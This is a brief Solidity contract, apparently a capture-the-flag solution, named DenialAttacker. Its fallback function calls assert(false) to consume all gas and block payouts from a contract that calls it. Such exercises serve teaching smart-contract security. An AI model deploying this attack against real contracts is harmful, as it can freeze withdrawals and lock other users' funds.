// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract DenialAttacker {
    fallback() external payable {
        // assert consumes all (!) gas
        assert(false);
    }
}
